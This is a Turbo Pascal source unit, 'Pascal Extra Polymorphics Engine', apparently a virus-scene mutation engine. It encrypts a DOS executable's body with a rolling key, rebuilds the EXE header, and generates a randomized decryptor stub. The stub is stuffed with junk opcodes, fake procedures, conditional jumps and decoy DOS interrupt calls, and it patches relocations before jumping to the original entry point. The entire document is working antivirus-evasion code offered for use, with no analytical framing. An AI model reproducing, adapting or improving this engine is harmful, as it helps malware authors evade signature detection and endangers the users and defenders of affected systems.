   Unit    PePe;
   { Pascal Extra Polymorphics Engine }
   {$X+}
   Interface
   Function DoPoly(SCode:Pointer;SCLen:Word;Var Dst:Pointer):Word;
   implementation
   Const
   Decryptor : Array [0..35] of Byte = (
           $B8,            { Mov Pointer }
       $B8,        { Mov Counter }
       $B0,        { Mov Keyword }
       $3E,$00,    { Add Ds:[Pointer],Keyword }
       $48,        { Dec counter }
       $40,        { Inc Pointer }
       $80,$C0,        { Add Keyword }
       $0B,        { Or Counter,Counter }
       $75,        { Jne }
       $E9,        { Jmp }
       $E9,        { Jmp }
           $8C,$C0,    { Mov Reg,Es }
       $83,$C0,$10,    { Add Reg,10 }
       $81,$C0,    { Add Reg,xxxx }
       $50,        { Push Reg }
       $B8,        { Mov Reg,xxxx }
       $50,        { Push Reg }

           $E8,            { Call xxxx }
           $58,        { Pop Point }
       $B8,        { Mov Reg2,num }
       $2E,$8B,    { Mov Point2,cs:[Point] }
       $26,$01,    { Add Es:[Point2],Reg }
       $40,$40,    { Inc,Inc }
       $48,$74,    { Dec Jne }
       $E9,        { Jmp }
       $CB);       { Retf }


   Var
   NoCalls : Boolean;

   Point,Counter,KeyWord,Resv : Byte;          { Some variables }
   Dest,Src:Pointer;
   CurDec,CurCr:Word;
   Prev:Byte;
   NKey,AKey:Byte;
   Calls:Array [0..25] of Word;
   Callsn:Byte;
   InnerCalls:Byte;
   JxNum : Byte;
   Relo : Array [0..300] of Word;              { Relo array }
   Relonum : Word;

   Function GetDByte:Byte;
   Begin
   GetDByte := Decryptor[CurDec];              { Get decryptor byte }
   Inc(CurDec);
   End;

   Procedure PutByte(BB:Byte);
   Begin
   Mem[Seg(Dest^):Ofs(Dest^)+CurCr] := BB;         { Store byte }
   Inc(CurCr);
   End;

   Procedure PutWord(BB:Word);
   Begin
   Memw[Seg(Dest^):Ofs(Dest^)+CurCr] := BB;        { Store word }
   Inc(CurCr); Inc(CurCr);
   End;

   Procedure CopyDByte;
   Begin
   PutByte(GetDByte);              { Copy byte from decryptor }
   End;

   Procedure StoreWord(What,Where:Word);
   Begin
   MemW[Seg(Dest^):Ofs(Dest^)+Where] := What;  { Store word }
   End;

   Procedure StoreByte(What:Byte;Where:Word);
   Begin
   Mem[Seg(Dest^):Ofs(Dest^)+Where] := What;   { Store byte }
   End;

   Function GetWord(Where:Word):Word;
   Begin
   GetWord := Memw[Seg(Src^):Ofs(Src^)+Where]; { Get word }
   End;

   Function GetByte(Where:Word):Word;
   Begin
   GetByte := Mem[Seg(Src^):Ofs(Src^)+Where];  { Get byte }
   End;

   {---------------------------------------------------------------}
   Function GReg:Byte;             { Choose unused register }
   Var
   L : Byte;
   Begin
   repeat
   L := Random(8);
   until (L<>Point) and (L<>Counter) and (L<>KeyWord) and (L<>Resv)
            and (L<>4) and (L <> KeyWord-4);
   GReg := L;
   End;

   Function Check(Reg:Byte):Boolean;       { Check if register is used }
   Begin
   Check := False;
   If (Reg = Point) or (Reg = Counter) or (Reg = KeyWord) or (Reg = Resv)
                or (Reg = 4) or (Reg = KeyWord - 4)
           then Check := True;
   End;

   Function GHigh:Byte;                { Choose second byte of
                             complex opcodes }
   Var
   B,C : Byte;
   Begin
   repeat
   B := Random($FF);
   C := (B and $38) shr 3;
   until Not Check(C);
   Ghigh := B;
   End;

   Function GetSize(G:Byte):Byte;          { Get size of complex opcode }
   Begin
   GetSize := 0;
   If (G < $40) and ( (G and $87) = 6 ) then
                     Begin
                     GetSize := 2;
                     Exit;
                     End;
   If (G < $40) or (G >= $C0) then Begin
                     GetSize := 0;
                     Exit;
                     End;
   If (G >= $40) and (G < $80) then Begin
                     GetSize := 1;
                     Exit;
                     End;
   If (G >= $80) and (G < $C0) then Begin
                     GetSize := 2;
                     Exit;
                     End;
   End;


   Procedure Garble(Small:Boolean); Forward;   { Garble ! }

   Procedure MakeOneByters;            { Creates onebyters }
   Const
   OneByte : Array [0..8] of Byte = ($2E,$3E,$F8,$F9,$FB,$FC,$FD,$26,$36);
   Begin
   PutByte(OneByte[Random(9)]);
   End;

   Procedure MakeImm16;                { Creates Mov Reg16,imm16 }
   Begin
   PutByte(GReg+$0B8);
   PutWord(Random($FFFF));
   End;

   Procedure MakeIncDec;               { Creates Inc/Dec Reg16 }
   Begin

   If Random(2)=0 then PutByte(GReg+$40)
                  else PutByte(GReg+$48);

   End;

   Procedure TwoThreeFour16;           { Creates complex opcode }
   Const
   TTF : Array [0..7] of Byte = ($03,$13,$23,$33,$0B,$1B,$2B,$3B);
   Var
   Y,B,G:Byte;
   Begin
   PutByte(TTF[Random(8)]);
   Y := GHigh;
   PutByte(Y);
   If GetSize(Y) <> 0 then
   For B := 1 to GetSize(Y) do PutByte(Random($FF));
   End;

   Procedure XchgAx;               { Xchg Ax,Reg16 }
   Begin
   If Not Check(0) then PutByte(GReg+$90);
   End;

   Procedure MakeProc;             { Creates procedure }
   Var
   SQ,SW:Word;
   Begin
   If (Callsn < 20) and (InnerCalls<5) and (JxNum = 0) then Begin
                           { Check if it allowed to
                             create call ? }
   Inc(InnerCalls);
   PutByte($E9);                   { Jmp Near }
   PutWord(0);
   SQ := CurCr;
   Garble(False);
   SW := CurCr;
   Garble(False);
   PutByte($C3);                   { Retn }
   Garble(True);
   StoreWord(CurCr-Sq,Sq-2);
   Calls[Callsn] := SW;
   Inc(Callsn);
   Dec(InnerCalls);
   End;
   End;

   Procedure MakeCall;         { Put Call to created procedure }
   Begin
   If Not NoCalls then
   If Callsn > 0   then begin
   PutByte($E8);                   { Call Near }
   PutWord(Calls[Random(Callsn)]-CurCr-2);
   End;
   End;

   Procedure MakeJx;               { Makes Jxx }
   Var
   T:Word;
   Begin
   If JxNum < 2 then Begin
   Inc(JxNum);
   PutByte(Random(16)+$70);
   PutByte(0);
   T := CurCr;
   Garble(False);
   StoreByte(CurCr-T,T-1);
   Dec(JxNum);
   End;
   End;

   Procedure MakeAxOp;         { Makes opcode that uses Ax }
   Const
   AxTbl : Array [0..9] of Byte = ($05,$15,$25,$35,$0D,$1D,$2D,$3D,$A9,$A1);
   Begin
   If Not Check(0) then Begin
   PutByte(AxTbl[Random(10)]);
   PutWord(Random($FFFF));
   End;
   End;

   Procedure MakeInt;          { Makes int }
   Const
   Funcs : Array [0..4] of Byte = ($0B,$19,$4B,$54,$FF);
   Ints  : Array [0..4] of Byte = ($21,$21,$21,$21,$12);
   Var
   Y:Byte;
   Begin
   If Not Check(0) then Begin
   Y := Random(5);
   PutByte($B4); PutByte(Funcs[Y]);
   PutByte($CD); PutByte(Ints[Y]);
   End;
   End;

   Function Think(Inn:Byte):Byte;          { Simple thinking procedure ;) }
   Begin
   If Prev = 0 then Begin
                     Think := 3;
                     Exit;
                     End;
   Think := Inn;
   End;

   Procedure Garble(Small:Boolean);        { Create garbage }
   Var
   R,T,V:Byte;
   Begin

   {Exit;}

   If Small and (JxNum=0) then R := Random(7)  { Small amount or large
                             amount of garbage }
                               else R := 0;
   Inc(R);

   For T := 0 to R do Begin            { Create garbage }

   V := Random(10);

   If Prev <> Think(V) then Begin          { Call procedure }
   Prev := Think(V);
   Case Think(V) of
   0: MakeOneByters;
   1: MakeImm16;
   2: MakeIncDec;
   3: TwoThreeFour16;
   4: XchgAx;
   5: MakeProc;
   6: MakeCall;
   7: MakeJx;
   8: MakeAxOp;
   9: MakeInt;
   End;
   End;
   End;
   End;

   {========================================================================}

   Function DoPoly(SCode:Pointer;SCLen:Word;Var Dst:Pointer):Word;
   Var Q,M : Byte;
   T1,T2,T3,T4,T5,T6,D1,D2,D4:Word;
   D3:Byte;
   OldCs,OldIp:Word;
   Begin
   Dest := Dst;
   Src  := SCode;
   CurDec := 0; Callsn := 0; InnerCalls := 0; JxNum := 0; NoCalls := False;
   CurCr  := 0;

   NKey := Random($FF);                { Create key }
   AKey := Random($FF);                { Create additional key }

   If Memw[Seg(SCode^):Ofs(SCode^)] <> $5A4D then Exit;
                           { Source is exe ? }
   T6 := GetWord(8) shl 4;

   PutWord($5A4D);
   PutWord(0);     PutWord(0);         { Exe size }
   PutWord(0); PutWord(2);         { Relo num/header size }
   PutWord(GetWord($A)); PutWord(GetWord($C)); { Min/Max Mem }
   PutWord(GetWord($E)); PutWord(GetWord($10));    { SS/SP }
   PutWord(0);                 { CheckSum }
   PutWord(0); PutWord(0);             { IP/CS }
   PutWord($1C); PutWord(0);           { ReloOfs/Ovl num }
   PutWord(0); PutWord(0);             { Fill up to 2 paragraphs }

   ReloNum := GetWord(6);              { Get relocations number }
   If ReloNum <> 0 then Begin          { There is some ? }
   T4 := GetWord($18);             { Yea ! Compact relocations }
   For D2 := 0 to ReloNum-1 do         {  to something more simple }
   Relo[D2] := GetWord(D2 shl 2 + T4 + 2) shl 4 + GetWord(D2 shl 2 + T4) + $100;
   End;

   OldIp := GetWord($14);              { Store old Cs'n'Ip }
   OldCs := GetWord($16);

   D3 := NKey;
   D4 := T6;

   For D2 := 1 to SCLen-T6 do Begin        { Encrypt body }
       PutByte(GetByte(D4) - D3);
       Inc(D3,AKey);
       Inc(D4);
       End;

   Resv := 4;

   { Initialise variables }
   Q := Random(3);
   Case Q of
   0: Point := 3;  { Bx }
   1: Point := 6;  { Si }
   2: Point := 7;  { Di }
   End;
   While (Q = Point) or (Q = 4) do Q := Random(8);
   Counter := Q;
   While (Q = Point) or (Q = Counter) or (Q-4 = Point) or (Q-4 = Counter)
                   do Q := Random(8);
   KeyWord := Q;

   StoreWord(0,$16);
   T1 := CurCr-32;
   StoreWord(T1,$14);

   Garble(False);
   PutByte(GetDByte+Point);        { Mov Pointer,100h }
   PutWord($100);
   Garble(False);
   PutByte(GetDByte+Counter);          { Mov Counter,Size }
   PutWord(SCLen-T6);
   Garble(False);
   PutByte(GetDByte+KeyWord);          { Mov KeyWord,key }
   PutByte(NKey);
   Garble(False);
   T3 := CurCr;                        { Decryption Loop }
   Garble(False);
   CopyDByte; CopyDByte;
   M := Point;
   If M = 3 then M := 7 Else Dec(M,2); { Add Ds:[Pointer],Keyword }
   PutByte(KeyWord shl 3 + M);
   Garble(False);

   PutByte(GetDByte + Counter);        { Dec Counter }
   Garble(False);

   PutByte(GetDByte + Point);          { Inc Pointer }
   Garble(False);

   CopyDByte;
   PutByte(GetDByte + KeyWord);        { Add KeyWord,AKey }
   PutByte(AKey);
   Garble(False);
   CopyDByte;                          { Or Counter,Counter }
   PutByte(Counter Shl 3 + $C0 + Counter);
   {Garble(False);}
   CopyDByte;                          { Jne Xxx }
   PutByte(0);
   T4 := CurCr;
   Garble(False);
   CopyDByte;                          { Jmp AllDone }
   PutWord(0);
   T5 := CurCr;
   Garble(False);
   StoreByte(CurCr - T4,T4-1);
   Garble(False);
   CopyDByte;
   PutWord(T3-CurCr-2);                { Jmp Decrypt }
   Garble(False);
   StoreWord(CurCr-T5,T5-2);           { Patch Jmp AllDone }

   Counter := 4; KeyWord := 4; Point := 4;
   Point   := GReg;
   Counter := GReg;

   Garble(False);

   NoCalls := True;

   CopyDByte;              { Mov Reg,Es }
   PutByte(GetDByte+Point);

   Garble(False);

   CopyDByte;
   PutByte(GetDByte+Point);        { Add Reg,10 }
   CopyDByte;

   Garble(False);

   CopyDByte;
   PutByte(GetDByte+Point);        { Add Reg,xxxx }
   PutWord(OldCs);

   Garble(False);

   PutByte(GetDByte+Point);        { Push Reg }

   Garble(False);

   PutByte(GetDByte+Counter);      { Mov Reg2,xxxx }
   PutWord(OldIp);

   Garble(False);

   PutByte(GetDByte+Counter);      { Push Reg2 }

   Garble(False);

   Counter := Point;                   { Free Counter }

   While Counter = Point   do Begin    { Counter = Pointer2 }
   Q := Random(3);
   Case Q of
   0: Counter := 3;  { Bx }
   1: Counter := 6;  { Si }
   2: Counter := 7;  { Di }
   End;
   End;

   Resv := Counter;

   While (Resv = Point)   or (Resv = Counter) do Begin
   Q := Random(3);
   Case Q of
   0: Resv := 3;  { Bx }
   1: Resv := 6;  { Si }
   2: Resv := 7;  { Di }
   End;
   End;

   KeyWord := GReg;

   If ReloNum <> 0 then begin

   CopyDByte;                          { Call xxxx }
   PutWord(0);
   T4 := CurCr;

   For D2 := 0 to ReloNum-1 do PutWord(Relo[D2]);

   Garble(False);

   StoreWord(CurCr-T4,T4-2);           { Patch Call }
   PutByte(GetDByte+Counter);         { Pop Pointer2 }

   Garble(False);

   PutByte(GetDByte+KeyWord);         { Mov Reg2,ReloNum }
   PutWord(ReloNum);

   Garble(False);
   T4 := CurCr;
   Garble(False);

   CopyDByte; CopyDByte;               { Mov Pointer2,Cs:[Pointer] }
   M := Counter;
   If M = 3 then M := 7 Else Dec(M,2);
   PutByte(Resv shl 3 + M);

   Garble(False);

   CopyDByte; CopyDByte;
   M := Resv;
   If M = 3 then M := 7 Else Dec(M,2); { Add Es:[Pointer2],Reg }
   PutByte(Point shl 3 + M);

   Garble(False);

   PutByte(GetDByte+Counter);         { Inc Pointer }

   Garble(False);

   PutByte(GetDByte+Counter);

   Garble(False);

   PutByte(GetDByte+KeyWord);          { Dec Counter }

   CopyDByte;              { Jnz xxx }
   PutByte(0);
   T5 := CurCr;
   Garble(False);
   CopyDByte;              { Jmp xxxx }
   PutWord(T4-CurCr-2);

   Garble(False);
   StoreByte(CurCr-T5,T5-1);

   NoCalls := False;

   Garble(True);

   End Else Inc(CurDec,12);

   CopyDByte;              { Retf }

   Dec(JxNum);

   Garble(True);

   StoreWord(CurCr div 512 + 1,4);
   StoreWord(CurCr mod 512,2);

   DoPoly := CurCr;

   End;

   End.
